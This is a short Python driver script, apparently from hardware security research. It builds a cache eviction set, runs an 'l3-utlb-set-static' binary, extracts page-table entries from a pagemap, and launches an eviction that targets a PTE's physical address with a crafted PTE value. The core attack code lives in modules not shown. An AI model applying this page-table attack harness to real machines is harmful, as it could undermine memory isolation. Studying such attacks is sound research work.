#!/usr/bin/python3

import subprocess
import time
import pagemap
import random
from run_util import *
from l2_set import get_eviction_set

eviction_set = get_eviction_set(18, n=18, indexed=True)
target = eviction_set[0]
# eviction_set[2] += 10
eviction_set = list(map(str, eviction_set))

cmd = ["./l3-utlb-set-static"] + eviction_set
print(f"[*] cmd: {' '.join(cmd)}")
prepare(cmd)

# extract PTEs from the pagemap
target_va = target_va + target * (1 * 1024 * 1024)
ptes = pagemap.retrieve_ptes(tmp_path + 'pagemap')
pte_pa = ptes[target_va][1]
pte_val = pagemap.make_pte_value(ptes[dummy_va][0])

launch_eviction(cmd, pte_pa, pte_val, sleep_time=8)
